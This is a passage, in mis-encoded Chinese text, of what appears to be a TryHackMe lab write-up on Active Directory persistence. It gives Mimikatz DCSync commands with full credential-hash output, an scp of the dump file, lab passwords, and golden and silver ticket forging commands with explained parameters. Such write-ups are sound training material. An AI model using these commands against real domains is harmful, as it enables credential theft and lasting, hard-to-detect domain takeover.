æœåŠ¡çš„å¸æˆ·ã€‚å¦‚æœæˆ‘ä»¬æ³„éœ²äº†ç‰¹æƒæœåŠ¡ï¼ˆä¾‹å¦‚ Exchangeã€Windows Server Update Services (WSUS) æˆ– System Center Configuration Manager (SCCM)ï¼‰çš„å¸æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ AD æ¼æ´å†æ¬¡è·å¾—ç‰¹æƒç«‹è¶³ç‚¹ã€‚ å½“è°ˆåˆ°è¦è½¬å‚¨å’Œä¿ç•™å“ªäº›å‡­è¯æ—¶ï¼Œå®ƒå—åˆ°å¾ˆå¤šå› ç´ çš„å½±å“ã€‚æ‚¨å¿…é¡»å‘æŒ¥åˆ›æ„å¹¶æ ¹æ®å…·ä½“æƒ…å†µè¿›è¡Œæ€è€ƒã€‚ç„¶è€Œï¼Œå¯¹äºè¿™ä¸ªæˆ¿é—´ï¼Œæˆ‘ä»¬å°†äº«å—ä¸€äº›ä¹è¶£ï¼Œè®©è“é˜Ÿæµæ±—ï¼Œå¹¶æ”¾å¼ƒæˆ‘ä»¬èƒ½å¾—åˆ°çš„æ¯ä¸€ä»½å‡­è¯ï¼ DCåŒæ­¥å…¨éƒ¨ æˆ‘ä»¬å°†ä½¿ç”¨ Mimikatz æ¥è·å–å‡­è¯ã€‚ä½¿ç”¨ DA å¸æˆ·é€šè¿‡ SSH ç™»å½• THMWRK1 å¹¶åŠ è½½ Mimikatzï¼š è®©æˆ‘ä»¬é¦–å…ˆå¯¹æˆ‘ä»¬è‡ªå·±çš„å•ä¸ªå¸æˆ·æ‰§è¡Œ DC åŒæ­¥ï¼š mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole [DC] 'za.tryhackme.loc' will be the domain [DC] 'THMDC.za.tryhackme.loc' will be the DC server [DC] 'louis.cole' will be the user account [rpc] Service : ldap [rpc] AuthnSvc : GSS_NEGOTIATE (9) Object RDN : louis.cole ** SAM ACCOUNT ** SAM Username : louis.cole Account Type : 30000000 ( USER_OBJECT ) User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) Account expiration : Password last change : 4/25/2022 6:30:03 PM Object Security ID : S-1-5-21-3885271727-2693558621-2658995185-1120 Object Relative ID : 1120 Credentials: Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc ntlm- 0: fbdcd5041c96ddbd82224270b57f11fc lm - 0: d40bfd7d451f6f58d12ff18ccab7e820 Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 474acb706d53bbdb880e1dd75bc4ba8d * Primary:Kerberos-Newer-Keys * Default Salt : ZA.TRYHACKME.LOClouis.cole Default Iterations : 4096 Credentials aes256_hmac (4096) : c069badc39ba1027c18b4833b4c25491f298a79e99eb227d44d0617b84a0b534 aes128_hmac (4096) : 9b07abcdc3c080f9d0a5cadfe2f6e244 des_cbc_md5 (4096) : 408920ec6426da52 * Primary:Kerberos * Default Salt : ZA.TRYHACKME.LOClouis.cole Credentials des_cbc_md5 : 408920ec6426da52 * Packages * NTLM-Strong-NTOWF * Primary:WDigest * 01 c9ec818441c8c6df6d1d831a0c6771af 02 4708f92952296eaa3d4b6553309843d6 03 350a3aa15bbab0697e93497f67d83114 04 c9ec818441c8c6df6d1d831a0c6771af 05 4708f92952296eaa3d4b6553309843d6 06 a95cc2cd2e9193f72632108e6ff4a361 07 c9ec818441c8c6df6d1d831a0c6771af ..... æ‚¨å°†çœ‹åˆ°ç›¸å½“å¤šçš„è¾“å‡ºï¼ŒåŒ…æ‹¬æ‚¨å¸æˆ·å½“å‰çš„ NTLM å“ˆå¸Œå€¼ã€‚æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨æ­¤ç±»ç½‘ç«™å°†æ‚¨çš„å¯†ç è½¬æ¢ä¸º NTLM å“ˆå¸Œæ¥éªŒè¯ NTLM å“ˆå¸Œæ˜¯å¦æ­£ç¡®ã€‚ è¿™å¾ˆæ£’ï¼Œä½†æˆ‘ä»¬å¸Œæœ› DC åŒæ­¥æ¯ä¸ªå¸æˆ·ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ Mimikatz ä¸Šå¯ç”¨æ—¥å¿—è®°å½•ï¼š ç¡®ä¿å°†æ›´æ”¹ä¸ºæ‚¨çš„ç”¨æˆ·åï¼Œä»¥å…è¦†ç›–å…¶ä»–ç”¨æˆ·çš„æ—¥å¿—è½¬å‚¨ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ /all æ ‡å¿—ï¼Œè€Œä¸æ˜¯æŒ‡å®šæˆ‘ä»¬çš„å¸æˆ·ï¼š lsadump::dcsync /domain:za.tryhackme.loc /all è¿™å°†éœ€è¦ä¸€äº›æ—¶é—´æ‰èƒ½å®Œæˆã€‚å®Œæˆåï¼Œé€€å‡º Mimikatz ä»¥å®Œæˆè½¬å‚¨æŸ¥æ‰¾ï¼Œç„¶åæ‚¨å¯ä»¥ä¸‹è½½ _dcdump.txt æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ cat &lt;username&gt;_dcdump.txt | grep \"SAM Username\" æ¢å¤æ‰€æœ‰ç”¨æˆ·åï¼Œä½¿ç”¨ cat &lt;username&gt;_dcdump.txt | grep \"Hash NTLM\" æ¢å¤æ‰€æœ‰å“ˆå¸Œå€¼ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œç¦»çº¿å¯†ç ç ´è§£æ”»å‡»æ¥æ¢å¤çº¯æ–‡æœ¬å‡­è¯ï¼Œæˆ–è€…ç®€å•åœ°ä½¿ç”¨ Mimikatz æ‰§è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ã€‚ scp Administrator@thmwrk1.za.tryhackme.loc:C:/Tools/mimikatz_trunk/x64/hybcx_dcdump.txt . //å¯†ç :tryhackmewouldnotguess1@ 0x03 é€šè¿‡ç¥¨æ®æŒä¹…åŒ– æ­£å¦‚å‰é¢ä»»åŠ¡ä¸­æ‰€è®¨è®ºçš„ï¼Œæˆ‘ä»¬ç»å¸¸å¸Œæœ›é€šè¿‡å…·æœ‰å§”æ´¾æƒé™çš„æœåŠ¡å¸æˆ·æ¥æŒä¹…åŒ–ä¼ªé€ é“¶ç¥¨å’Œé‡‘ç¥¨ã€‚ä½†è¿™äº›åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆæ¯æ¬¡è“é˜Ÿæ¡Œé¢æ¼”ä¹ ç»“æŸæ—¶éƒ½ä¼šæœ‰äººå¤§å–Šï¼šâ€œå†²æ‰æ‰€æœ‰é‡‘ç¥¨å’Œé“¶ç¥¨ï¼â€ã€‚ å·§å…‹åŠ›å·¥å‚é—¨ç¥¨ åœ¨è®¨è®ºé‡‘ç¥¨å’Œé“¶ç¥¨ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å¿«é€Ÿå›é¡¾ä¸€ä¸‹ Kerberos èº«ä»½éªŒè¯ã€‚ä¸‹å›¾æ˜¾ç¤ºäº† Kerberos èº«ä»½éªŒè¯çš„æ­£å¸¸æµç¨‹ï¼š ç”¨æˆ·åœ¨ DC ä¸Šå‘å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKDCï¼‰å‘å‡º AS-REQ è¯·æ±‚ï¼Œå…¶ä¸­åŒ…æ‹¬ä½¿ç”¨ç”¨æˆ·çš„ NTLM æ•£åˆ—åŠ å¯†çš„æ—¶é—´æˆ³ã€‚æœ¬è´¨ä¸Šï¼Œè¿™æ˜¯è¯·æ±‚ä¸€ä¸ªç¥¨æ®æˆäºˆç¥¨æ®ï¼ˆTGTï¼‰ã€‚DC æ£€æŸ¥ä¿¡æ¯å¹¶å°† TGT å‘é€ç»™ç”¨æˆ·ã€‚è¿™ä¸ª TGT ä½¿ç”¨ä»…å­˜å‚¨åœ¨ DC ä¸Šçš„ KRBTGT å¸æˆ·çš„å¯†ç å“ˆå¸Œè¿›è¡Œç­¾åã€‚ç°åœ¨ï¼Œç”¨æˆ·å¯ä»¥å°†è¿™ä¸ª TGT å‘é€ç»™ DCï¼Œä»¥è¯·æ±‚å¯¹ç”¨æˆ·æƒ³è¦è®¿é—®çš„èµ„æºçš„ç¥¨æ®æˆäºˆæœåŠ¡ï¼ˆTGSï¼‰ã€‚å¦‚æœ TGT æ£€æŸ¥é€šè¿‡ï¼ŒDC å°†å“åº” TGSï¼Œè¯¥ TGS ä½¿ç”¨ç”¨æˆ·è¯·æ±‚è®¿é—®çš„æœåŠ¡çš„ NTLM æ•£åˆ—åŠ å¯†ã€‚ç„¶åç”¨æˆ·å°†è¿™ä¸ª TGS æäº¤ç»™æœåŠ¡è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å¯ä»¥éªŒè¯ TGSï¼Œå› ä¸ºå®ƒçŸ¥é“è‡ªå·±çš„æ•£åˆ—å¹¶å¯ä»¥æˆäºˆç”¨æˆ·è®¿é—®æƒé™ã€‚ è¯´äº†æ‰€æœ‰è¿™äº›èƒŒæ™¯ç†è®ºåï¼Œæ˜¯æ—¶å€™ç ”ç©¶ä¸€ä¸‹é‡‘ç¥¨å’Œé“¶ç¥¨äº†ã€‚ é»„é‡‘ç¥¨æ® é‡‘ç¥¨æ˜¯ä¼ªé€ çš„ TGTã€‚è¿™æ„å‘³ç€æˆ‘ä»¬ç»•è¿‡ä¸Šå›¾ä¸­çš„æ­¥éª¤ 1 å’Œ 2ï¼Œå‘ DC è¯æ˜æˆ‘ä»¬æ˜¯è°ã€‚æ‹¥æœ‰ç‰¹æƒå¸æˆ·çš„æœ‰æ•ˆ TGTï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä¸ºå‡ ä¹ä»»ä½•æˆ‘ä»¬æƒ³è¦çš„æœåŠ¡è¯·æ±‚ TGSã€‚ä¸ºäº†ä¼ªé€ é‡‘ç¥¨ï¼Œæˆ‘ä»¬éœ€è¦ KRBTGT å¸æˆ·çš„å¯†ç å“ˆå¸Œï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ç”¨æˆ·å¸æˆ·ç­¾ç½² TGTã€‚å…³äºé‡‘ç¥¨çš„ä¸€äº›æœ‰è¶£çš„è¯´æ˜ï¼š é€šè¿‡åœ¨ Kerberos è¿›ç¨‹çš„æ­¤é˜¶æ®µè¿›è¡Œæ³¨å…¥ï¼Œæˆ‘ä»¬ä¸éœ€è¦è¦æ¨¡æ‹Ÿçš„å¸æˆ·çš„å¯†ç å“ˆå¸Œï¼Œå› ä¸ºæˆ‘ä»¬ç»•è¿‡äº†è¯¥æ­¥éª¤ã€‚ TGTä»…ç”¨äºè¯æ˜DCä¸Šçš„KDCå¯¹å…¶è¿›è¡Œäº†ç­¾åã€‚ç”±äºå®ƒæ˜¯ç”± KRBTGT å“ˆå¸Œç­¾åçš„ï¼Œå› æ­¤è¯¥éªŒè¯é€šè¿‡ï¼Œå¹¶ä¸”æ— è®ºå…¶å†…å®¹å¦‚ä½•ï¼Œâ€‹â€‹TGT éƒ½è¢«å£°æ˜ä¸ºæœ‰æ•ˆã€‚ è¯´åˆ°å†…å®¹ï¼ŒKDC åªä¼šéªŒè¯ TGT ä¸­æŒ‡å®šçš„ç”¨æˆ·å¸æˆ·ï¼ˆå¦‚æœè¯¥å¸æˆ·æ—©äº 20 åˆ†é’Ÿï¼‰ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†ç¦ç”¨ã€åˆ é™¤æˆ–ä¸å­˜åœ¨çš„å¸æˆ·æ”¾å…¥ TGTï¼Œåªè¦æˆ‘ä»¬ç¡®ä¿æ—¶é—´æˆ³ä¸è¶…è¿‡ 20 åˆ†é’Ÿï¼Œå®ƒå°±æœ‰æ•ˆã€‚ ç”±äºç¥¨è¯çš„ç­–ç•¥å’Œè§„åˆ™æ˜¯åœ¨ TGT æœ¬èº«ä¸­è®¾ç½®çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¦†ç›– KDC æ¨é€çš„å€¼ï¼Œä¾‹å¦‚ç¥¨è¯åªèƒ½åœ¨ 10 å°æ—¶å†…æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿æˆ‘ä»¬çš„ TGT æœ‰æ•ˆæœŸä¸º 10 å¹´ï¼Œä»è€Œèµ‹äºˆæˆ‘ä»¬æŒä¹…æ€§ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒKRBTGT å¸æˆ·çš„å¯†ç æ°¸è¿œä¸ä¼šæ›´æ”¹ï¼Œè¿™æ„å‘³ç€ä¸€æ—¦æˆ‘ä»¬æ‹¥æœ‰å¯†ç ï¼Œé™¤éæ‰‹åŠ¨è½®æ¢ï¼Œå¦åˆ™æˆ‘ä»¬å¯ä»¥é€šè¿‡æ°¸ä¹…ç”Ÿæˆ TGT æ¥è·å¾—æŒä¹…è®¿é—®æƒé™ã€‚ è“é˜Ÿå¿…é¡»å°† KRBTGT å¸æˆ·çš„å¯†ç è½®æ¢ä¸¤æ¬¡ï¼Œå› ä¸ºå½“å‰å¯†ç å’Œä»¥å‰çš„å¯†ç å¯¹è¯¥å¸æˆ·ä»ç„¶æœ‰æ•ˆã€‚è¿™æ˜¯ä¸ºäº†ç¡®ä¿å¯†ç çš„æ„å¤–è½®æ¢ä¸ä¼šå½±å“æœåŠ¡ã€‚ è½®æ¢ KRBTGT å¸æˆ·çš„å¯†ç å¯¹äºè“é˜Ÿæ¥è¯´æ˜¯ä¸€é¡¹éå¸¸ç—›è‹¦çš„è¿‡ç¨‹ï¼Œå› ä¸ºè¿™å°†å¯¼è‡´ç¯å¢ƒä¸­çš„å¤§é‡æœåŠ¡åœæ­¢å·¥ä½œã€‚ä»–ä»¬å¯èƒ½è®¤ä¸ºè‡ªå·±æ‹¥æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ TGTï¼Œæœ‰æ—¶ç”šè‡³ä¼šæŒç»­å‡ ä¸ªå°æ—¶ï¼Œä½†é‚£ä¸ª TGT å·²ç»å¤±æ•ˆäº†ã€‚å¹¶éæ‰€æœ‰çš„æœåŠ¡éƒ½è¶³å¤Ÿæ™ºèƒ½ï¼Œèƒ½å¤Ÿåœ¨ TGT å¤±æ•ˆåé‡Šæ”¾å®ƒï¼ˆå› ä¸ºæ—¶é—´æˆ³ä»ç„¶æœ‰æ•ˆï¼‰ï¼Œå› æ­¤å®ƒä»¬ä¸ä¼šè‡ªåŠ¨è¯·æ±‚ä¸€ä¸ªæ–°çš„ TGTã€‚ é»„é‡‘ç¥¨æ®ç”šè‡³å¯ä»¥è®©æ‚¨ç»•è¿‡æ™ºèƒ½å¡éªŒè¯ï¼Œå› ä¸ºåœ¨åˆ›å»º TGT ä¹‹å‰ï¼Œæ™ºèƒ½å¡æ˜¯ç”± DC éªŒè¯çš„ã€‚ é™¤äº† KRBTGT å¸æˆ·çš„å¯†ç å“ˆå¸Œä¹‹å¤–ï¼Œæˆ‘ä»¬åªéœ€è¦åŸŸåã€åŸŸ SID å’Œæˆ‘ä»¬æƒ³è¦æ¨¡æ‹Ÿçš„äººçš„ç”¨æˆ· IDã€‚å¦‚æœæˆ‘ä»¬å¤„äºå¯ä»¥æ¢å¤ KRBTGT å¸æˆ·å¯†ç å“ˆå¸Œçš„ä½ç½®ï¼Œé‚£ä¹ˆæˆ‘ä»¬å·²ç»å¤„äºå¯ä»¥æ¢å¤å…¶ä»–æ‰€éœ€ä¿¡æ¯çš„ä½ç½®äº†ã€‚ ç™½é“¶ç¥¨æ® é“¶ç¥¨æ˜¯ä¼ªé€ çš„ TGS ç¥¨ã€‚å› æ­¤ï¼Œç°åœ¨ï¼Œæˆ‘ä»¬è·³è¿‡ä¸ DC ä¸Šçš„ K DC è¿›è¡Œçš„æ‰€æœ‰é€šä¿¡ï¼ˆä¸Šå›¾ä¸­çš„æ­¥éª¤ 1-4ï¼‰ï¼Œè€Œåªä¸æˆ‘ä»¬æƒ³è¦ç›´æ¥è®¿é—®çš„æœåŠ¡è¿›è¡Œäº¤äº’ã€‚å…³äºé“¶ç¥¨çš„ä¸€äº›æœ‰è¶£çš„è¯´æ˜ï¼š ç”Ÿæˆçš„ TGS ç”±æˆ‘ä»¬ç›®æ ‡ä¸»æœºçš„æœºå™¨å¸æˆ·ç­¾åã€‚ é‡‘ç¥¨å’Œé“¶ç¥¨ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºæˆ‘ä»¬è·å¾—çš„ç‰¹æƒæ•°é‡ã€‚å¦‚æœæˆ‘ä»¬æ‹¥æœ‰ KRBTGT å¸æˆ·çš„å¯†ç å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¿é—®æ‰€æœ‰å†…å®¹ã€‚ä½¿ç”¨é“¶ç¥¨ï¼Œç”±äºæˆ‘ä»¬åªèƒ½è®¿é—®æˆ‘ä»¬æ­£åœ¨æ”»å‡»çš„æœåŠ¡å™¨çš„è®¡ç®—æœºå¸æˆ·çš„å¯†ç å“ˆå¸Œï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½æ¨¡æ‹Ÿè¯¥ä¸»æœºæœ¬èº«çš„ç”¨æˆ·ã€‚é“¶ç¥¨çš„èŒƒå›´ä»…é™äºç‰¹å®šæœåŠ¡å™¨ä¸Šçš„ä»»ä½•æœåŠ¡ã€‚ ç”±äº TGS æ˜¯ä¼ªé€ çš„ï¼Œæ‰€ä»¥æ²¡æœ‰å…³è”çš„ TGTï¼Œè¿™æ„å‘³ç€ DC ä»æœªè¢«è”ç³»è¿‡ã€‚è¿™ä½¿å¾—æ”»å‡»éå¸¸å±é™©ï¼Œå› ä¸ºå”¯ä¸€å¯ç”¨çš„æ—¥å¿—å°†åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šã€‚å› æ­¤ï¼Œè™½ç„¶èŒƒå›´æ›´æœ‰é™ï¼Œä½†å¯¹äºè“é˜Ÿæ¥è¯´ï¼Œæ£€æµ‹èµ·æ¥è¦å›°éš¾å¾—å¤šã€‚ ç”±äºæƒé™æ˜¯é€šè¿‡ SID ç¡®å®šçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å†æ¬¡ä¸ºé“¶ç¥¨è¯åˆ›å»ºä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·ï¼Œåªè¦æˆ‘ä»¬ç¡®ä¿è¯¥ç¥¨è¯å…·æœ‰å°†ç”¨æˆ·ç½®äºä¸»æœºçš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­çš„ç›¸å…³ SIDã€‚ æœºå™¨å¸æˆ·çš„å¯†ç é€šå¸¸æ¯ 30 å¤©è½®æ¢ä¸€æ¬¡ï¼Œè¿™ä¸åˆ©äºæŒä¹…æ€§ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ TGS æä¾›çš„è®¿é—®æƒé™æ¥è®¿é—®ä¸»æœºæ³¨å†Œè¡¨å¹¶æ›´æ”¹è´Ÿè´£æœºå™¨å¸æˆ·å¯†ç è½®æ¢çš„å‚æ•°ã€‚ä»è€Œç¡®ä¿æœºå™¨å¸æˆ·ä¿æŒé™æ€å¹¶æˆäºˆæˆ‘ä»¬åœ¨æœºå™¨ä¸Šçš„æŒä¹…æ€§ã€‚ è™½ç„¶åªèƒ½è®¿é—®å•ä¸ªä¸»æœºå¯èƒ½çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªæ˜¾è‘—çš„é™çº§ï¼Œä½†æœºå™¨å¸æˆ·å¯ä»¥åƒæ™®é€šçš„ADå¸æˆ·ä¸€æ ·ä½¿ç”¨ï¼Œä¸ä»…å…è®¸æ‚¨å¯¹ä¸»æœºè¿›è¡Œç®¡ç†å‘˜è®¿é—®ï¼Œè¿˜å¯ä»¥ç»§ç»­åƒä½¿ç”¨ADç”¨æˆ·å¸æˆ·ä¸€æ ·æšä¸¾å’Œåˆ©ç”¨ADã€‚ ä¼ªé€ é—¨ç¥¨ä»¥è·å–ä¹è¶£å’Œåˆ©æ¶¦ ç°åœ¨æˆ‘ä»¬å·²ç»è§£é‡Šäº†é‡‘ç¥¨å’Œé“¶ç¥¨çš„åŸºç¡€çŸ¥è¯†ï¼Œè®©æˆ‘ä»¬ç”Ÿæˆä¸€äº›ã€‚æ‚¨å°†éœ€è¦ KRBTGT å¸æˆ·çš„ NTLM å“ˆå¸Œå€¼ï¼Œç”±äºåœ¨ä¸Šä¸€ä¸ªä»»åŠ¡ä¸­æ‰§è¡Œäº† DC åŒæ­¥ï¼Œæ‚¨ç°åœ¨åº”è¯¥æ‹¥æœ‰è¯¥å“ˆå¸Œå€¼ã€‚æ­¤å¤–ï¼Œè®°ä¸‹ä¸ THMSERVER1 è®¡ç®—æœºå¸æˆ·å…³è”çš„ NTLM å“ˆå¸Œå€¼ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦è¿™ä¸ªå“ˆå¸Œå€¼ä½œä¸ºé“¶ç¥¨ã€‚æ‚¨å¯ä»¥åœ¨æ‰§è¡Œçš„ DC è½¬å‚¨ä¸­æ‰¾åˆ°æ­¤ä¿¡æ¯ã€‚æˆ‘ä»¬éœ€è¦çš„æœ€åä¸€æ¡ä¿¡æ¯æ˜¯åŸŸ SIDã€‚ä½¿ç”¨ THMWRK1 ä¸Šçš„ä½ç‰¹æƒ SSH ç»ˆç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ AD-RSAT cmdlet æ¥æ¢å¤æ­¤ä¿¡æ¯ï¼š ssh za\\\\phillip.wilkins@thmwrk1.za.tryhackme.loc &nbsp; //Your credentials have been generated: Username: phillip.wilkins Password: Developmental1971 è¾“å…¥ä»¥ä¸‹å‘½ä»¤è·å–åˆ°ç›¸å…³ä¿¡æ¯ PS C:\\Users\\phillip.wilkins&gt; Get-ADDomain AllowedDNSSuffixes : {} ChildDomains : {} ComputersContainer : CN=Computers,DC=za,DC=tryhackme,DC=loc DeletedObjectsContainer : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc DistinguishedName : DC=za,DC=tryhackme,DC=loc DNSRoot : za.tryhackme.loc DomainControllersContainer : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc DomainMode : Windows2012R2Domain DomainSID : S-1-5-21-3885271727-2693558621-2658995185 ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc Forest : tryhackme.loc InfrastructureMaster : THMDC.za.tryhackme.loc LastLogonReplicationInterval : LinkedGroupPolicyObjects : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc} LostAndFoundContainer : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc ManagedBy : Name : za NetBIOSName : ZA ObjectClass : domainDNS ObjectGUID : 1fc9e299-da51-4d03-baa0-862c3360c0b2 ParentDomain : tryhackme.loc PDCEmulator : THMDC.za.tryhackme.loc PublicKeyRequiredPasswordRolling : QuotasContainer : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc ReadOnlyReplicaDirectoryServers : {} ReplicaDirectoryServers : {THMDC.za.tryhackme.loc} RIDMaster : THMDC.za.tryhackme.loc SubordinateReferences : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc} SystemsContainer : CN=System,DC=za,DC=tryhackme,DC=loc UsersContainer : CN=Users,DC=za,DC=tryhackme,DC=loc ç°åœ¨æˆ‘ä»¬å·²ç»æ‹¥æœ‰äº†æ‰€æœ‰å¿…éœ€çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°å¯åŠ¨ Mimikatzï¼š åŠ è½½ Mimikatz åï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œä»¥ç”Ÿæˆé»„é‡‘ç¥¨è¯ï¼š kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt å‚æ•°è§£é‡Šï¼š /admin - æˆ‘ä»¬è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·åã€‚è¿™ä¸å¿…æ˜¯æœ‰æ•ˆç”¨æˆ·ã€‚ /domain - æˆ‘ä»¬è¦ä¸ºå…¶ç”Ÿæˆç¥¨è¯çš„åŸŸçš„ FQDNã€‚ /id - ç”¨æˆ· RIDã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz ä½¿ç”¨ RID 500ï¼Œè¿™æ˜¯é»˜è®¤çš„ç®¡ç†å‘˜å¸æˆ· RIDã€‚ /sid - æˆ‘ä»¬è¦ä¸ºå…¶ç”Ÿæˆç¥¨è¯çš„åŸŸçš„ SIDã€‚ /krbtgt - KRBTGT å¸æˆ·çš„ NTLM å“ˆå¸Œå€¼ã€‚ /endin - ç¥¨è¯æœ‰æ•ˆæœŸã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz ç”Ÿæˆä¸€å¼ æœ‰æ•ˆæœŸä¸º 10 å¹´çš„ç¥¨è¯ã€‚ ADé»˜è®¤çš„Kerberosç­–ç•¥æ˜¯10å°æ—¶ï¼ˆ600åˆ†é’Ÿï¼‰ /renewmax - ç»­è®¢çš„æœ€é•¿ç¥¨è¯ç”Ÿå‘½å‘¨æœŸã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz ç”Ÿæˆä¸€å¼ æœ‰æ•ˆæœŸä¸º 10 å¹´çš„ç¥¨è¯ã€‚ ADé»˜è®¤çš„Kerberosç­–ç•¥æ˜¯7å¤©ï¼ˆ10080åˆ†é’Ÿï¼‰ /ptt - è¯¥æ ‡å¿—å‘Šè¯‰ Mimikatz å°†ç¥¨è¯ç›´æ¥æ³¨å…¥ä¼šè¯ä¸­ï¼Œè¿™æ„å‘³ç€å®ƒå·²å‡†å¤‡å¥½ä½¿ç”¨ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹åŸŸæ§åˆ¶å™¨è¿è¡Œ dir å‘½ä»¤æ¥éªŒè¯é»„é‡‘ç¥¨è¯æ˜¯å¦æ­£å¸¸å·¥ä½œï¼š dir \\\\thmdc.za.tryhackme.loc\\c$\\ åœ¨è¿™é‡Œæˆ‘åˆå¦èµ·äº†ä¸€ä¸ªsshä¼šè¯ï¼Œæ¥ç€è¾“å…¥ä»¥ä¸Šå‘½ä»¤å‘ç°æ²¡æœ‰æƒé™ æ¥ç€æˆ‘åœ¨åŸsshä¸Šè¯•äº†è¯•å‘ç°æˆåŠŸ å³ä½¿é»„é‡‘ç¥¨æ®çš„æœ‰æ•ˆæœŸéå¸¸é•¿ï¼Œè“é˜Ÿä»ç„¶å¯ä»¥é€šè¿‡ç®€å•åœ°ä¸¤æ¬¡è½®æ¢ KRBTGT å¯†ç æ¥é˜²å¾¡ã€‚å¦‚æœæˆ‘ä»¬çœŸçš„æƒ³æ·±å…¥äº†è§£ï¼Œæˆ‘ä»¬å¸Œæœ›ç”Ÿæˆç™½é“¶ç¥¨æ®ï¼Œè¿™äº›ç¥¨æ®ä¸å¤ªå¯èƒ½è¢«å‘ç°ï¼Œå¹¶ä¸”æ›´éš¾ä»¥é˜²å¾¡ï¼Œå› ä¸ºå¿…é¡»è½®æ¢æ¯ä¸ªæœºå™¨å¸æˆ·çš„å¯†ç ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ Mimikatz å‘½ä»¤æ¥ç”Ÿæˆç™½é“¶ç¥¨æ®ï¼š kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1.za.tryhackme.loc /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt å‚æ•°è§£é‡Šï¼š /admin - æˆ‘ä»¬è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·åã€‚è¿™ä¸å¿…æ˜¯æœ‰æ•ˆç”¨æˆ·ã€‚ /domain - æˆ‘ä»¬è¦ä¸ºå…¶ç”Ÿæˆç¥¨è¯çš„åŸŸçš„ FQDNã€‚ /id - ç”¨æˆ· RIDã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz ä½¿ç”¨ RID 500ï¼Œè¿™æ˜¯é»˜è®¤çš„ç®¡ç†å‘˜å¸æˆ· RIDã€‚ /sid - æˆ‘ä»¬è¦ä¸ºå…¶ç”Ÿæˆç¥¨è¯çš„åŸŸçš„ SIDã€‚ /target - æˆ‘ä»¬çš„ç›®æ ‡æœåŠ¡å™¨çš„ä¸»æœºåã€‚è®©æˆ‘ä»¬åš THMSERVER1.za.tryhackme.locï¼Œä½†å®ƒå¯ä»¥æ˜¯ä»»ä½•åŠ å…¥åŸŸçš„ä¸»æœºã€‚ /rc4 - æˆ‘ä»¬çš„ç›®æ ‡è®¡ç®—æœºå¸æˆ·çš„ NTLM å“ˆå¸Œå€¼ã€‚æŸ¥çœ‹ DC åŒæ­¥ç»“æœä»¥æŸ¥æ‰¾ THMSERVER1$ çš„ NTLM å“ˆå¸Œå€¼ã€‚ $ è¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªæœºå™¨å¸æˆ·ã€‚ /service - æˆ‘ä»¬åœ¨ TGS ä¸­è¯·æ±‚çš„æœåŠ¡ã€‚ CIFS æ˜¯ä¸€ä¸ªå®‰å…¨çš„é€‰æ‹©ï¼Œå› 